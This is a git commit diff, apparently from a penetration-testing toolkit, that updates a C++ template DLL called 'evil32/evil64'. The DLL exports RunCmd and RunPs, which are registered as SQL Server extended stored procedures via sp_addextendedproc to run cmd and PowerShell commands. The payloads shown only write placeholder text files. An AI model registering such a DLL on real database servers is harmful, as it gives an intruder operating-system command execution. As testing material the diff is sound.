fcd265a73ee4a2365daa13237e78ad63b2ff4987
Scott Sutherland <scott.sutherland@nullbind.com>
2016-03-15 21:32:00 -0500

    Update xp_cmd_template.cpp

--- Stable-ish/MSSQL/xp_cmd_template.cpp
+++ Stable-ish/MSSQL/xp_cmd_template.cpp
@@ -1,16 +1,21 @@
+// DllMain.cpp
 // Reference: http://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure
 // compile for 32 and 64 
 // manual tests
 // rundll32 evil32.dll,RunCmd
+// rundll32 evil32.dll,RunPs
 // rundll32 evil64.dll,RunCmd
+// rundll32 evil64.dll,RunPs
 // register tests
 // sp_addextendedproc 'RunCmd', 'c:\Temp\evil32.dll';
 // sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
+// sp_addextendedproc 'RunPs', 'c:\Temp\evil32.dll';
+// sp_addextendedproc 'RunPs', 'c:\Temp\evil64.dll';
 // RunCmd
+// RunPs
 // removal
 // sp_dropextendedproc 'RunCmd';
-// sp_dropextendedproc 'RunCmd';
-// DllMain.cpp
+// sp_dropextendedproc 'RunPs';
 
 #include "stdafx.h"			//dllmain.cpp : Defines the entry point for the DLL application.
 #include "srv.h"			//Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
@@ -28,20 +33,26 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
 		break;
 	}
 	return TRUE;
-}
+} 
 
-#define DLL_FUNC extern "C" __declspec (dllexport)     
-
-DLL_FUNC int __stdcall RunCmd(const char * MyCmd) {
+#define RUNCMD_FUNC extern "C" __declspec (dllexport)     
+RUNCMD_FUNC int __stdcall RunCmd(const char * MyCmd) {
 
 	// Run OS command
-	system("echo hello > c:\\Temp\\stuff.txt");
-	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo hello > c:\\Temp\\evil1_cmd.txt"), TEXT(" C:\\ "), SW_SHOW);
-
-	// Run PowerShell command
-	system("echo hello > c:\\Temp\\stuff.txt");
-	ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'test'|out-file c:\\temp\\evil2_ps.txt \" "), TEXT(" C:\\ "), SW_SHOW);
+	system("echo hello > c:\\Temp\\evil_cmd1.txt");
+	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo hello > c:\\Temp\\evil_cmd2.txt"), TEXT(" C:\\ "), SW_SHOW);
 
 	return 1;
 }
+
+#define RUNPS_FUNC extern "C" __declspec (dllexport)     
+RUNPS_FUNC int __stdcall RunPs(const char * MyPs) {
+
+	// Run PowerShell command
+	system("PowerShell -C \"'test'|out-file c:\\temp\\evil_ps1.txt\"");
+	ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'test'|out-file c:\\temp\\evil_ps2.txt \" "), TEXT(" C:\\ "), SW_SHOW);
+
+	return 1;
+}
+
 
